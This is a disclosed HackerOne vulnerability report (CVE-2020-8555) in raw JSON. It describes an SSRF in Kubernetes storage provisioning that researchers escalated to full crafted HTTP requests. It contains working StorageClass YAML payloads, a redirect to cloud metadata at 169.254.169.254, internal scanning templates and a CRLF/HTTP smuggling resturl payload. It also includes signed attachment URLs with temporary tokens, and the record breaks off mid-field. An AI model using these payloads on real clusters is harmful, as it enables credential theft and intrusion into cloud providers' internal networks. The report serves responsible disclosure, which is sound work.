{"id":776017,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NzYwMTc=","url":"https://hackerone.com/reports/776017","title":"Half-Blind SSRF found in kube/cloud-controller-manager can be upgraded to complete SSRF (fully crafted HTTP requests) in vendor managed k8s service.","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-01-15T22:33:11.684Z","submitted_at":"2020-01-15T22:33:11.684Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"reeverzax","url":"/reeverzax","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/186/226/fda450093940a615c855b463ca1731e49138076c_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":39386,"url":"https://hackerone.com/kubernetes","handle":"kubernetes","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Kubernetes","twitter_handle":"kubernetesio","website":"https://kubernetes.io/","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":true,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8555"],"singular_disclosure_disabled":false,"disclosed_at":"2020-10-30T21:37:19.120Z","bug_reporter_agreed_on_going_public_at":"2020-10-30T21:37:18.661Z","team_member_agreed_on_going_public_at":"2020-10-30T21:28:28.383Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\n\n## Who we are :\n\nWe’re two French security researchers and our respective names are Brice Augras and\nChristophe Hauquiert, we worked and found the vulnerability together.\n\nBrice Augras from https://www.groupe-asten.fr/ company - https://hackerone.com/reeverzax\nChristophe Hauquiert - https://hackerone.com/hach\n\n## Summary\n\nWe recently led some security investigations about Kubernetes product hosted in a managed\nservice.\nBy abusing product vulnerability due to implementation context, we would like to bring to your\nattention technical details about what we found.\nWe started an investigation process on multiple managed k8s offers and found quite each time a Critical\nImpact vulnerability as this can vary from half-blind SSRF and allow an attacker to perform internal services enumeration inside the distributor perimeter to full SSRF vulnerability .\nWe're getting in touch with you about the vulnerability you just got aware of two weeks ago from security team we were in touch with.  \n\n## Technical specification : \n\n- Fake vendor name : **example.com**\n- Kubernetes release for half-blind SSRF scenario: **1.14**\n- Kubernetes release for complete SSRF vulnerability :  up to **v1.15.3**, **v1.14.6** and **v1.13.10**\n\nWe don't know if the previous information regarding k8s release can be useful for you as each distributor seems to manage its own k8s custom cluster release. \n- Attacker server: **https://bzh.ovh** (51.38.238.22)\n- Provided file with proof of concept scripts: **PoC.zip**\n\n{F685902}\n\n## Compromission Scenario\n\nHere is the main workflow we followed in order to escape from our customer environment on multiple distributors \nproviding k8s managed offer.\n\nFirstly, we created a k8s cluster on distributors managed k8s service.\nMainly, these vendors use the following infrastructure : \n\n{F685875}\n\nAfter configuring kubectl binary, we were able to manage our customer cluster provided by **example.com**\n\nWhen creating a persistent volume claim associated with a custom StorageClass on our\ncluster, the provisioning step is handled by the **kube/cloud controller manager** (depending of the release),\nwe noticed that the process was handled  inside vendor internal perimeter.\nWe discovered the existence of a half-blind SSRF vulnerability inside multiple\nStorageClasses (glusterfs, scaleio, storageos) due to k8s managed context.\n\nThis half-blind SSRF can be used us to scan master VPC network and request the different listening services\n(Metadata instance, Kubelet, ETCD, etc..) based on the **kube-controller** responses.\n\nInitially, we were only limited to HTTP POST requests as we were unable to retrieve content of\nbody page if the response code was equal to 200 and not in JSON Content-Type.\nBut we improved our first payload by combining the previous step with a 302 redirect from an\nexternal server in order to convert POST request to GET request.\n\nIn addition to this, if the managed k8s offer service provider was using an old k8s cluster release **AND** allowed customer **kube-controller-manager** logs access, an attacker could interact in a more convenient way by crafting full user-controllable HTTP requests and get full HTTP response.\nThis was the attack scenario with the most impact. \nIndeed, while we were working on our research project, we managed to perform some of the following actions among different managed k8s providers: Priv esc with credential retrieving via metadata instances, DoS the master instance with HTTP request (unencrypted) on ETCD master instances, etc...\n \n## PoC\n### PoC n°1 - Half Blind SSRF\n\nWhile doing some analysis on **glusterFS** storage Class Golang source, we noticed that \nthe first HTTP request issued during a Volume creation\n(https://github.com/heketi/heketi/blob/master/client/api/go-client/volume.go#L34), **/volumes**\nwas appended at the end of the user provided URL in **resturl** parameter.\nIn order to remove the end of this unwanted path, we used the **#** trick in the resturl\nparameter.\nHere is the first YAML payload we used as evidence for the half-blind SSRF vulnerability:\n\n```yaml\napiVersion: storage.k8s.io/v1\nkind: StorageClass\nmetadata:\nname: poc-ssrf\nprovisioner: kubernetes.io/glusterfs\nparameters:\nresturl: \"http://bzh.ovh:6666/#\"\nclusterid: \"630372ccdc720a92c681fb928f27b53f\"\nrestauthenabled: \"true\"\nrestuser: \"admin\"\nsecretNamespace: \"default\"\nsecretName: \"poc-ssrf-secret\"\ngidMin: \"40000\"\ngidMax: \"50000\"\nvolumetype: \"replicate:3\"\n---\napiVersion: v1\ndata:\nkey: bXlwYXNzd29yZA==\nkind: Secret\nmetadata:\nname: poc-ssrf-secret\nnamespace: default\ntype: kubernetes.io/glusterfs\n---\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\nname: poc-ssrf\nspec:\naccessModes:\n- ReadWriteOnce\nvolumeMode: Filesystem\nresources:\nrequests:\nstorage: 8Gi\nstorageClassName: poc-ssrf\n```\n\nWe executed the payload with kubectl binary, and the kube-controller-manager handled the\ncreation process and HTTP request:\n\n```bash\nkubectl create -f sc-poc.yam\n```\nThe attacker server was put in listening mode on port 6666 in order to handle incoming\nPOST requests and verify that how the URL could be arbirary controlled by an attacker:\n\n{F685801}\n\n### PoC n°2 : Redirecting POST to GET HTTP request trick\n\nThe first request issued by Glusterfs client was a POST type, by doing the following steps,\nwe were able to convert POST request to GET:\n\n• Storage class uses http://bzh.ovh/redirect.php# as resturl parameter\n• https://bzh.ovh/redirect.php endpoint responds with 302 HTTP return code with the\nfollowing Location Header http://169.254.169.254 (could be any other internal\nresource, this redirected url is used for example purposes)\n• As by default Golang net/http library follows redirection and convert POST to GET\nwith 302 return code, the targeted resource is then requested with a HTTP GET request.\n\nWe were able to read HTTP response body on some requests by describing persistent\nvolume claim object:\n```\nkubectl describe pvc xxx\n```\n\nOr, getting events from Kubernetes cluster with command below:\n```\nkubectl get event\n```\nHere is an example of JSON response we were able to retrieve : \n\n{F685919}\n\nThe exploitation process of our vulnerability at this moment was limited due to the\nfollowing elements:\n- We were not able to inject HTTP headers in the emitted request\n- We were not able to perform POST HTTP Request with body parameters (useful to\nrequest key value on ETCD instance running on 2379 PORT if HTTP unencrypted is used)\n- We were not able to retrieve response body content when HTTP return code was\n200 and not a JSON Content-Type response.\n\n\n### PoC n°3 : Managed cluster Lan scanning and sensitive data exposure \n\nAt least, as we had the possibility to scan LAN resources, the next step was automation.\nIndeed, in order to scan one IP address and one port we had to realize the following tasks:\n- Delete previous tested Storage Class\n- Delete previous tested Persistent Volume Claim\n- Change IP and PORT in sc.yaml\n- Create Storage Class with new IP and port\n- Create new Persistent Volume Claim\nSince the way to scan for one resource was very specific and incompatible with traditional\nSSRF exploitation tools or scanners, we decided to create some kind of custom workers in\nbash script.\nIn order to be able to scan 172.16.0.0/12 range faster, we launched 15 simultaneously workers.\nThe above IP range was chosen just for demonstration purposes and can be adapted to each provider internal IP range. \n \nEach worker was launched the following command:\n\n{F685904}\n\nHere are two additional YAML files that needs to be in the same directory as scanner.sh Bash\nscript:\n```yaml\napiVersion: storage.k8s.io/v1\nkind: StorageClass\nmetadata:\nname: {{SC_NAME}}\nprovisioner: kubernetes.io/glusterfs\nparameters:\nresturl: \"http://{{URL}}#\"\nclusterid: \"630372ccdc720a92c681fb928f27b53f\"\nrestauthenabled: \"true\"\nrestuser: \"admin\"\nsecretNamespace: \"default\"\nsecretName: \"heketi-secret\"\ngidMin: \"40000\"\ngidMax: \"50000\"\nvolumetype: \"replicate:3\"\n```\nAbove is the content of **template_sc.yaml**\n\n```yaml\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\nname: {{PVC_NAME}}\nspec:\naccessModes:\n- ReadWriteOnce\nvolumeMode: Filesystem\nresources:\nrequests:\nstorage: 8Gi\nstorageClassName: {{SC_NAME}}\n```\nAbove is the content of **template_pvc.yaml**\n\n### PoC n°4  : CRLF + smuggling HTTP injection in old Kubernetes cluster releases \n\nIn addition to all the previous steps, we found a more efficient way to retrieve full HTTP\nresponse body content in addition to craft complete HTTP requests that were user controlled.\n\nUnfortunately, the vulnerability requires the following prerequisites:\n- Kube Controller Manager logs reachable by the customer\n- Kubernetes Cluster version using Golang version \u003c1.12 (See technical requirements chapter for additional information about specific k8s releases concerned)\n\nWe still wan't to bring this attack scenario with a PoC as some providers still have some \ncustomers using one of these “deprecated” k8s release.\n\nWe realized a first PoC in a local environment to demonstrate the vulnerability.\nHere are some technical details about them:\nWe discovered a vulnerability was existing for the following Golang releases \u003c1.12\n(https://github.com/golang/go/issues/30794) that allowed to produce HTTP smuggling/CRLF\nattacks.\nBy combining the Half-Blind SSRF described above and the vulnerability, we were able to send complete\ncrafted requests, including custom headers, HTTP method, parameters and data that were\ngoing to be executed by the **kube-controller-manager**.\n\nIn addition to previous steps, we were able to retrieve full HTTP responses from interal requested resource. \n\nWe deployed a local environment simulating Kubernetes exchanges between the GlusterFS\nGo client and a fake targeted server. (PoC is http-smuggling-poc in the zip file).\n\nHere is an example of a working StorageClass resturl parameter payload performing an HTTP\nsmuggling attack + CRLF during provisioning step in order to leak response content in kube-\ncontroller logs:\n\nHere is an example of a working StorageClass **resturl** parameter payload allowing to perform this kind of attack scenario : \n\n```\nhttp://172.31.X.1:10255/healthz? HTTP/1.1\\r\\nConnection: keep-\nalive\\r\\nHost: 172.31.X.1:10255\\r\\nContent-Length: 1\\r\\n\\r\\n1\\r\\nGET /pods? HTTP/1.1\\r\\nHost: 172.31.X.1:10255\\r\\n\\r\\n\n```\n\nHere is the complete HTTP response that was leaking inside the **lube-controller-manage** logs :\n\n{F685896}\n\n## Impact\n\n## Impact Analysis\n\nThis was quite hard for us to evaluate how hard the impact was for these two attack vectors. \nIndeed, as they are vendor dependent, we preferred to take the lowest score we found about impact analysis regarding to whom we reported the security problematic.\nFeel free to exchange with us about the **CVSS** score about you consider for this vulnerability as this seems to be related to managed context k8s environment.\n\nFrom the various distributors we led research on, we noticed that this could lead to  the following impact analysis : \n \n### Integrity\n\n- Lateral movement with cloud steal credentials (from metadata API)\n- Remote command execution by using these credentials\n- Reproducing above scenario in an IDOR way with other resources discovered in LAN area.\n\n### Confidentiality\n\n- Information gathering by LAN scannin (ssh version, http server versions, ...)\n- Instances and infrastructure information by requesting internal API like metadata APIs (http://169.254.169.254, ...)\n- Customers data leak, by using cloud credentials\n\n### Availability\n\nAll the post-exploitation scenarios about **integrity** attack vectors could be used to perform disruptive scenarios and make master instance from our customer perimeter or other customer unavailable. \n\nIndeed, as we are in managed k8senvironment and considering the integrity impact, we can imagine lots of scenarios that can impact availability. An additional example could be to corrupt ETCD database or perform critical call to kubernetes API.\n\nBest Regards, \n\nBrice Augras from @Groupe-Asten\nChristophe Hauquiert","bounty_amount":"5000.0","formatted_bounty":"$5,000","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":685801,"file_name":"screen1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3ZSYftaTxURTiyUDpH5C4FG2?response-content-disposition=attachment%3B%20filename%3D%22screen1.png%22%3B%20filename%2A%3DUTF-8%27%27screen1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152614Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=6da174dfe1f545eab9c84159e1f6fbc2b1ef1b016c59d8bd5b5fa4de54061b05","file_size":55515,"type":"image/png"},{"id":685875,"file_name":"screen2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/o3coTnW5jynaDXScVGceDuT5?response-content-disposition=attachment%3B%20filename%3D%22screen2.png%22%3B%20filename%2A%3DUTF-8%27%27screen2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152614Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b867110f3d125938cd6b4994d286c674508a3c4f5a9970787c4484a695606ce3","file_size":37072,"type":"image/png"},{"id":685896,"file_name":"CRLF.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/uCt2ysr2iux5BkSorDkvovZp?response-content-disposition=attachment%3B%20filename%3D%22CRLF.png%22%3B%20filename%2A%3DUTF-8%27%27CRLF.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152614Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=1a2a594747ec314ac503aea111d2295a892d226ca538aa2befb5750a6843aae5","file_size":103076,"type":"image/png"},{"id":685902,"file_name":"PoC.zip","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9QUtMeZurtKvaceRZHUe8Ncr?response-content-disposition=attachment%3B%20filename%3D%22PoC.zip%22%3B%20filename%2A%3DUTF-8%27%27PoC.zip\u0026response-content-type=application%2Fzip\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152614Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=a731da808e94c754a9f10ff8a5481239d40f150d9ff6542af38536f43e86ba1a","file_size":6886,"type":"application/zip"},{"id":685904,"file_name":"worker.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/of7o9uN5nbDT3TebpV9ALSU4?response-content-disposition=attachment%3B%20filename%3D%22worker.png%22%3B%20filename%2A%3DUTF-8%27%27worker.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152614Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d1cfd4f53b73be2a9f13446ad106a4e7f1903bee5bb4fd1769abdb3dd7cd7490","file_size":87826,"type":"image/png"},{"id":685919,"file_name":"json_response.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/GsX24cJ33LhFGNPqX6ZgBXc7?response-content-disposition=attachment%3B%20filename%3D%22json_response.png%22%3B%20filename%2A%3DUTF-8%27%27json_response.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152614Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ef2ac3e7b585f28b006f2b78cc1ab026c3e103a02785264daefb2136bc447b7f","file_size":37800,"type":"image/png"}],"allow_singular_disclosure_at":"2020-11-29T21:28:28.510Z","allow_singular_disclosure_after":-27280665.86867608,"singular_disclosure_allowed":true,"vote_count":19,"voters":["pretorian","th3hidd3nmi